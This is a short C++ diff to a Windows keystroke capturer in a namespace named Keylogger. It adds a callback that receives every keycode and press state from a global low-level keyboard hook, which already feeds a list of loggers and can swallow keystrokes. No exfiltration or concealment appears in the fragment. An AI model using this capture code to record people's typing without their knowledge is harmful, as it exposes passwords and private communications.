@@ -4,6 +4,7 @@ namespace Keylogger {
 
 std::vector<ILogger*> KeystrokeCapturerWindows::_loggers;
 bool KeystrokeCapturerWindows::_consumeKeystrokes = false;
+std::function<void(int keycode, KeyState state)> KeystrokeCapturerWindows::_callback = nullptr;
 
 bool KeystrokeCapturerWindows::start() {
     _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
@@ -16,6 +17,10 @@ void KeystrokeCapturerWindows::stop() {
 
 void KeystrokeCapturerWindows::consumeKeystrokes(bool consume) {
     _consumeKeystrokes = consume;
+}
+
+void KeystrokeCapturerWindows::setCallback(std::function<void(int keycode, KeyState state)> callback) {
+    _callback = callback;
 }
 
 void KeystrokeCapturerWindows::addLogger(ILogger* logger) {
@@ -40,6 +45,10 @@ LRESULT CALLBACK KeystrokeCapturerWindows::LowLevelKeyboardProc(int nCode, WPARA
             default:
                 state = KeyState::Released;
                 break;
+            }
+
+            if (_callback) {
+                _callback(p->vkCode, state);
             }
 
             for (ILogger* logger : _loggers) {
